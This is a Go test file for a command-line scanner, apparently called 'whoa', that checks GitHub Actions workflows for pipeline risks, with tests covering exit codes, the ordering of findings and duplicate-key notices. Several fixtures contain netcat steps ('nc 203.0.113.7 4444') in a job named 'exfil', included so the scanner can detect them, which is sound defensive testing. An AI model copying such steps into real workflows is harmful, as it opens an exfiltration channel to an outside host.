package main

import (
	"bytes"
	"strings"
	"testing"

	"github.com/Vibrouz/whoa/internal/findings"
)

// A workflow that blocks, for exercising the scan path end to end.
const blockingWorkflow = `on:
  push:
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: nc 203.0.113.7 4444 < /dev/null
`

// A workflow with nothing wrong in it.
const cleanWorkflow = `on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make test
`

// scanArgs runs the whole command and returns what it wrote plus the exit code.
func scanArgs(t *testing.T, stdin string, args ...string) (stdout, stderr string, code int) {
	t.Helper()
	var out, errBuf bytes.Buffer
	code = run(args, strings.NewReader(stdin), &out, &errBuf)
	return out.String(), errBuf.String(), code
}

// A finding reaches the output, with the tier, the rule and the location.
func TestScanReportsFindings(t *testing.T) {
	stdout, _, _ := scanArgs(t, blockingWorkflow, "scan", "-")

	if !strings.Contains(stdout, "scanned 1 workflow") {
		t.Errorf("missing the scanned count:\n%s", stdout)
	}
	// The file name is printed as a heading so that two similarly named files
	// cannot be confused for one.
	if !strings.Contains(stdout, "<stdin>") {
		t.Errorf("the file heading is missing:\n%s", stdout)
	}
	if !strings.Contains(stdout, "BLOCK") {
		t.Errorf("missing the BLOCK tier:\n%s", stdout)
	}
	if !strings.Contains(stdout, "PPE-004") {
		t.Errorf("missing the rule id:\n%s", stdout)
	}
	if !strings.Contains(stdout, "in job exfil") {
		t.Errorf("missing the job context:\n%s", stdout)
	}
}

// A clean workflow reports a clean count and says so, rather than printing an
// empty list and leaving the reader to work out whether that means zero findings
// or a failure to run.
func TestScanCleanWorkflow(t *testing.T) {
	stdout, _, _ := scanArgs(t, cleanWorkflow, "scan", "-")

	if !strings.Contains(stdout, "0 blocks, 0 warnings") {
		t.Errorf("missing the clean count:\n%s", stdout)
	}
	if strings.Contains(stdout, "BLOCK") {
		t.Errorf("a clean workflow should not print BLOCK:\n%s", stdout)
	}
}

// Blocks sort above warnings, so the thing that blocks a merge is never below
// the fold behind a list of warnings.
func TestScanSortsBlocksFirst(t *testing.T) {
	// One workflow that both blocks and warns, so the two tiers appear together.
	workflow := `on:
  push:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: nc 203.0.113.7 4444 < /dev/null
`
	stdout, _, _ := scanArgs(t, workflow, "scan", "-")

	// Search for the tier markers as they appear on an indented finding line, not
	// for the bare words. "warn" is a substring of "warning" in the summary,
	// which sits above every finding and made this assert the wrong thing.
	blockAt := strings.Index(stdout, "  BLOCK ")
	warnAt := strings.Index(stdout, "  warn  ")
	if blockAt < 0 || warnAt < 0 {
		t.Fatalf("expected both tiers:\n%s", stdout)
	}
	if blockAt > warnAt {
		t.Errorf("BLOCK should come first:\n%s", stdout)
	}
}

// A message is one long paragraph, and eleven of them in a row is a wall. The
// listing has to be short enough to scan.
func TestSummariseShortensLongMessages(t *testing.T) {
	long := strings.Repeat("word ", 60)

	got := summarise(long)
	if len(got) > 130 {
		t.Errorf("summarise returned %d characters, want it much shorter:\n%q", len(got), got)
	}
	if !strings.HasSuffix(got, "...") {
		t.Errorf("a truncated summary should end with an ellipsis, got %q", got)
	}
}

// Cutting at the first sentence rather than at a fixed width keeps the summary
// readable, which matters more than an exactly even column.
func TestSummarisePrefersSentenceBoundary(t *testing.T) {
	got := summarise("203.0.113.7 is a bare IP address in a script. " + strings.Repeat("more ", 80))
	if got != "203.0.113.7 is a bare IP address in a script." {
		t.Errorf("summarise = %q, want the first sentence only", got)
	}
}

func TestSummariseLeavesShortMessagesAlone(t *testing.T) {
	const msg = "a short message"
	if got := summarise(msg); got != msg {
		t.Errorf("summarise = %q, want it unchanged", got)
	}
}

// A workflow that will not parse is a workflow that was not checked. Reporting
// that as a clean run would be the worst possible answer, so it goes to stderr
// and is never folded into the finding counts.
func TestScanReportsParseErrors(t *testing.T) {
	broken := "on:\n  push:\njobs:\n  j:\n   bad indent here\n"

	stdout, _, code := scanArgs(t, broken, "scan", "-")

	// Everything on stdout now, so the failure is not something a reader has to
	// know to look for on stderr.
	if !strings.Contains(stdout, "could not check 1 file") {
		t.Errorf("the unchecked section is missing:\n%s", stdout)
	}
	if !strings.Contains(stdout, "must be a mapping") {
		t.Errorf("the reason is missing:\n%s", stdout)
	}
	if !strings.Contains(stdout, "scanned 0 workflows") {
		t.Errorf("the summary does not say nothing was scanned:\n%s", stdout)
	}
	if code != exitIncomplete {
		t.Errorf("exit = %d, want %d: an unfinished scan is not a clean result", code, exitIncomplete)
	}
}

// One broken workflow must not hide the findings in every other one. They are
// reported together rather than aborting at the first error.
func TestScanContinuesPastABrokenWorkflow(t *testing.T) {
	dir := writeTree(t, map[string]string{
		".github/workflows/good.yml":   blockingWorkflow,
		".github/workflows/broken.yml": "on:\n  push:\njobs:\n  j:\n   bad indent here\n",
	})

	stdout, _, code := scanArgs(t, "", "scan", dir)

	if !strings.Contains(stdout, "BLOCK") {
		t.Errorf("the good workflow's finding was lost:\n%s", stdout)
	}
	if !strings.Contains(stdout, "must be a mapping") {
		t.Errorf("the broken workflow was not reported:\n%s", stdout)
	}
	// The good file blocks, so that outranks the incomplete scan.
	if code != exitBlocked {
		t.Errorf("exit = %d, want %d: a confirmed Block outranks an unfinished scan", code, exitBlocked)
	}
}

// Two files whose names differ by one letter, one scanned and one refused. This
// is the case that made the original output unreadable: the error named the
// second file with nothing to separate it, so it read as a finding about the
// first.
func TestScanSeparatesFilesWithSimilarNames(t *testing.T) {
	dir := writeTree(t, map[string]string{
		".github/workflows/boom.yml":  blockingWorkflow,
		".github/workflows/bomba.yml": "on:\n  push:\njobs:\n  j:\n   bad indent here\n",
	})

	stdout, _, code := scanArgs(t, "", "scan", dir)

	if !strings.Contains(stdout, "boom.yml") {
		t.Errorf("the scanned file is not named:\n%s", stdout)
	}
	if !strings.Contains(stdout, "could not check") {
		t.Errorf("the unchecked section is missing:\n%s", stdout)
	}
	if code != exitBlocked {
		t.Errorf("exit = %d, want %d", code, exitBlocked)
	}
}

// An unreadable file is counted as skipped rather than named, so a repository
// root full of unrelated YAML does not bury the output.
func TestScanReportsSkippedCount(t *testing.T) {
	dir := writeTree(t, map[string]string{
		".github/workflows/ci.yml":   cleanWorkflow,
		".github/workflows/notes.md": "not a workflow",
	})

	stdout, _, code := scanArgs(t, "", "scan", dir)
	if !strings.Contains(stdout, "1 other file not scanned") {
		t.Errorf("missing the skipped count:\n%s", stdout)
	}
	// A file we chose not to look at is not a gap in the scan, so it does not make
	// the scan incomplete and does not change the exit code.
	if code != exitOK {
		t.Errorf("exit = %d, want %d", code, exitOK)
	}
}

// A scan that found no workflow at all says so, and says it is not a clean
// result.
//
// The message matters more than it looks. The old wording was "nothing to
// check", which reads like a repository with nothing wrong in it, and the exit
// code was 0, which is exactly what a merge gate reads as approval. Pointing
// the scan at a directory with no workflows in it is the most ordinary mistake
// there is, and it has to be distinguishable from a repository that is clean.
func TestScanEmptyDirectory(t *testing.T) {
	dir := writeTree(t, map[string]string{"README.md": "docs"})

	stdout, _, code := scanArgs(t, "", "scan", dir)

	if !strings.Contains(stdout, "no workflows found") {
		t.Errorf("missing the empty result message:\n%s", stdout)
	}
	// It must not read like a clean bill of health.
	if strings.Contains(stdout, "nothing to check") {
		t.Errorf("the message reads like a clean result:\n%s", stdout)
	}
	if code != exitIncomplete {
		t.Errorf("exit = %d, want %d: a scan that looked at nothing is not a clean scan", code, exitIncomplete)
	}
}

// The same holds for a directory that exists and holds an empty workflow
// directory, which is a different mistake from the one above and produces the
// same false clean.
func TestScanEmptyWorkflowDirectory(t *testing.T) {
	dir := writeTree(t, map[string]string{".github/workflows/README.md": "docs"})

	stdout, _, code := scanArgs(t, "", "scan", dir)

	if !strings.Contains(stdout, "no workflows found") {
		t.Errorf("missing the empty result message:\n%s", stdout)
	}
	if code != exitIncomplete {
		t.Errorf("exit = %d, want %d: a scan that looked at nothing is not a clean scan", code, exitIncomplete)
	}
}

// A workflow that was found and is clean is a clean scan, and still exits 0.
//
// This is the case the fix above must not break. The distinction is between
// finding nothing and finding nothing wrong.
func TestScanCleanWorkflowStillExitsZero(t *testing.T) {
	dir := writeTree(t, map[string]string{".github/workflows/ci.yml": cleanWorkflow})

	stdout, _, code := scanArgs(t, "", "scan", dir)

	if !strings.Contains(stdout, "scanned 1 workflow, 0 blocks, 0 warnings") {
		t.Errorf("the summary is wrong:\n%s", stdout)
	}
	if strings.Contains(stdout, "no workflows found") {
		t.Errorf("a workflow was found, so this is not an empty scan:\n%s", stdout)
	}
	if code != exitOK {
		t.Errorf("exit = %d, want %d: a clean scan is a clean scan", code, exitOK)
	}
}

// A missing path is a usage error and says which path.
func TestScanMissingPath(t *testing.T) {
	_, stderr, code := scanArgs(t, "", "scan", "no-such-directory")
	if code != exitIncomplete {
		t.Errorf("exit = %d, want %d", code, exitIncomplete)
	}
	if !strings.Contains(stderr, "no-such-directory") {
		t.Errorf("stderr does not name the path: %s", stderr)
	}
}

// The exit code matrix. Every row is a combination a CI job can actually hit, and
// the two that overlap are the ones that needed deciding.
func TestExitCodes(t *testing.T) {
	broken := "on:\n  push:\njobs:\n  j:\n   bad indent here\n"

	// The directory cases need a path rather than standard input, so the table
	// carries one or the other.
	//
	// The earlier version of this table always scanned standard input, which
	// meant the "a bad path" case was passing because standard input was empty
	// rather than because the path was bad. Two different mistakes, one exit
	// code, so the test was green for the wrong reason and would have stayed
	// green if the path handling broke.
	emptyDir := writeTree(t, map[string]string{"README.md": "docs"})

	tests := []struct {
		name string
		// stdin is the workflow to read from standard input. The directory
		// cases use dir instead.
		stdin string
		dir   string
		// wantIn is a string the output has to contain, and where it has to
		// appear. It is what tells two cases that share an exit code apart.
		wantIn    string
		wantOnErr bool
		want      int
		reason    string
	}{
		{
			name:   "clean workflow exits 0",
			stdin:  cleanWorkflow,
			want:   exitOK,
			reason: "nothing blocks and everything was read",
		},
		{
			name:   "warn only exits 0",
			stdin:  "on:\n  push:\n  workflow_dispatch:\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make deploy\n",
			want:   exitOK,
			reason: "a Warn must never fail a build, or people ignore the output",
		},
		{
			name:   "a Block exits 1",
			stdin:  blockingWorkflow,
			want:   exitBlocked,
			reason: "this is the merge gate",
		},
		{
			name:   "an unreadable file exits 2",
			stdin:  broken,
			want:   exitIncomplete,
			reason: "the scan did not finish, so its result is not trustworthy",
		},
		{
			// The message matters here, not just the code. A bad path and an
			// empty scan both exit 2, and they are different problems with
			// different remedies, so the output has to say which one it was.
			name:      "a bad path exits 2",
			dir:       "no-such-directory",
			wantIn:    "no-such-directory",
			wantOnErr: true,
			want:      exitIncomplete,
			reason:    "the invocation was wrong",
		},
		{
			// A scan that found no workflow did not check anything, so its
			// result says nothing about the repository.
			name:   "no workflows found exits 2",
			dir:    emptyDir,
			wantIn: "no workflows found",
			want:   exitIncomplete,
			reason: "a false clean in a merge gate is worse than a false alarm",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var stdout, stderr string
			var code int
			if tt.dir != "" {
				stdout, stderr, code = scanArgs(t, "", "scan", tt.dir)
			} else {
				stdout, stderr, code = scanArgs(t, tt.stdin, "scan", "-")
			}
			if code != tt.want {
				t.Errorf("exit = %d, want %d (%s)", code, tt.want, tt.reason)
			}
			if tt.wantIn == "" {
				return
			}
			// The message may be on stdout or on stderr, so both are searched.
			// The two failure modes print to different places and a test that
			// insisted on one would be asserting on a formatting choice.
			if !strings.Contains(stdout, tt.wantIn) && !strings.Contains(stderr, tt.wantIn) {
				t.Errorf("the output does not mention %q:\nstdout:\n%s\nstderr:\n%s", tt.wantIn, stdout, stderr)
			}
		})
	}
}

// A Block outranks an incomplete scan. Both are true when a scan finds a problem
// and also fails to check a file, and one exit code has to carry it. The
// confirmed problem is the more actionable news, so reporting "could not
// complete" there would understate it.
func TestBlockOutranksIncomplete(t *testing.T) {
	dir := writeTree(t, map[string]string{
		".github/workflows/blocks.yml": blockingWorkflow,
		".github/workflows/broken.yml": "on:\n  push:\njobs:\n  j:\n   bad indent here\n",
	})

	stdout, _, code := scanArgs(t, "", "scan", dir)

	if code != exitBlocked {
		t.Errorf("exit = %d, want %d", code, exitBlocked)
	}
	// Both facts have to be visible, because the exit code only carries one.
	if !strings.Contains(stdout, "BLOCK") {
		t.Errorf("the finding is missing:\\n%s", stdout)
	}
	if !strings.Contains(stdout, "could not check") {
		t.Errorf("the unchecked file is missing:\\n%s", stdout)
	}
}

// A duplicate key is reported without stopping the scan, because GitHub accepts
// the file and refusing it would fail a workflow that runs in production.
func TestDuplicateKeyIsReportedAsANotice(t *testing.T) {
	dup := "on:\n  push:\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n" +
		"      - name: s\n        run: echo first\n        run: echo second\n"

	stdout, _, code := scanArgs(t, dup, "scan", "-")

	if code != exitOK {
		t.Errorf("exit = %d, want %d: GitHub accepts this file", code, exitOK)
	}
	if !strings.Contains(stdout, "note") {
		t.Errorf("the duplicate key was not reported:\\n%s", stdout)
	}
	if !strings.Contains(stdout, "only the last one is used") {
		t.Errorf("the notice does not say what happened:\\n%s", stdout)
	}
}

// A notice is separate from a finding and says so, so a reader can tell what the
// tool noticed from what it decided.
func TestNoticesAreDistinguishableFromFindings(t *testing.T) {
	// The dangerous command has to be in the *surviving* step, because that is the
	// one that runs. Putting it in the dropped half would prove nothing.
	dir := writeTree(t, map[string]string{
		".github/workflows/ci.yml": "on:\n  push:\n    branches: [main]\njobs:\n  j:\n" +
			"    runs-on: ubuntu-latest\n    steps:\n" +
			"      - name: gone\n        run: echo dropped\n        run: echo kept\n" +
			"      - run: nc 203.0.113.7 4444 < /dev/null\n",
	})

	stdout, _, _ := scanArgs(t, "", "scan", dir)

	if !strings.Contains(stdout, "note ") {
		t.Errorf("no note line:\n%s", stdout)
	}
	if !strings.Contains(stdout, "BLOCK ") {
		t.Errorf("no finding line:\n%s", stdout)
	}
	// A notice must not be counted as a block or a warning.
	if !strings.Contains(stdout, "1 block, 0 warnings") {
		t.Errorf("the notice was counted as a finding:\n%s", stdout)
	}
}

// The dropped half of a duplicate is not scanned, because it does not run. That
// is what makes last-one-wins safe: what is analysed is what GitHub executes.
func TestDroppedScriptIsNotScanned(t *testing.T) {
	// One step with two run keys. Two separate "- run:" entries would be two
	// ordinary steps and would correctly produce no notice.
	dup := "on:\n  push:\n    branches: [main]\njobs:\n  j:\n    runs-on: ubuntu-latest\n" +
		"    steps:\n" +
		"      - run: nc 198.51.100.42 4444 < /dev/null\n" +
		"        run: echo harmless\n"

	stdout, _, code := scanArgs(t, dup, "scan", "-")

	if code != exitOK {
		t.Errorf("exit = %d, want %d", code, exitOK)
	}
	if strings.Contains(stdout, "198.51.100.42") {
		t.Errorf("an address in the dropped half was reported, but that code never runs:\n%s", stdout)
	}
}

// Ordering within one file: Block before Warn, then line, then rule ID.
//
// The rule ID tiebreak exists because two findings on the same line with the same
// tier have no other ordering, and an unstable one would make the golden files
// for the end to end tests flaky.
func TestSortFindingsOrdering(t *testing.T) {
	list := []flatFinding{
		{finding: findings.New("PPE-010", findings.SeverityWarn, "w", findings.At("f", 2))},
		{finding: findings.New("PPE-004", findings.SeverityBlock, "b1", findings.At("f", 9))},
		{finding: findings.New("PPE-006", findings.SeverityBlock, "b2", findings.At("f", 5))},
		{finding: findings.New("PPE-011", findings.SeverityBlock, "b3", findings.At("f", 5))},
		{finding: findings.New("PPE-001", findings.SeverityBlock, "b4", findings.At("f", 1))},
	}
	sortFindings(list)

	want := []string{"PPE-001", "PPE-006", "PPE-011", "PPE-004", "PPE-010"}
	for i, w := range want {
		if list[i].finding.RuleID != w {
			t.Errorf("position %d = %s, want %s", i, list[i].finding.RuleID, w)
		}
	}
}

// Two files that both produce findings are reported as two groups, in path order,
// rather than as one flat list where the file boundaries are invisible.
func TestGroupByFileKeepsFilesTogether(t *testing.T) {
	scanned := []checked{
		{path: "b.yml", findings: findings.Findings{
			findings.New("PPE-004", findings.SeverityBlock, "b", findings.At("b.yml", 1)),
		}},
		{path: "a.yml", findings: findings.Findings{
			findings.New("PPE-010", findings.SeverityWarn, "a", findings.At("a.yml", 1)),
			findings.New("PPE-001", findings.SeverityBlock, "a2", findings.At("a.yml", 2)),
		}},
		{path: "", findings: findings.Findings{
			findings.New("PPE-007", findings.SeverityWarn, "s", findings.At("<stdin>", 1)),
		}},
	}

	groups := groupByFile(scanned)
	if len(groups) != 3 {
		t.Fatalf("got %d groups, want 3", len(groups))
	}
	// <stdin> has an empty path and sorts first.
	if groups[0].title != "<stdin>" {
		t.Errorf("first group = %q, want <stdin>", groups[0].title)
	}
	if groups[1].title != "a.yml" || groups[2].title != "b.yml" {
		t.Errorf("groups = %q, %q, want a.yml then b.yml", groups[1].title, groups[2].title)
	}
	// Two findings in one group stay together and in severity order.
	if len(groups[1].findings) != 2 {
		t.Fatalf("a.yml has %d findings, want 2", len(groups[1].findings))
	}
	if groups[1].findings[0].finding.RuleID != "PPE-001" {
		t.Errorf("first in a.yml = %s, want the Block", groups[1].findings[0].finding.RuleID)
	}
}

// A file with no findings and no notices produces no group, so a clean scan does
// not print an empty heading per file.
func TestGroupByFileSkipsQuietFiles(t *testing.T) {
	groups := groupByFile([]checked{{path: "quiet.yml"}})
	if len(groups) != 1 {
		t.Fatalf("got %d groups, want 1: the file is still a group", len(groups))
	}
	if len(groups[0].findings) != 0 || len(groups[0].notices) != 0 {
		t.Error("a quiet file should have nothing in its group")
	}
}
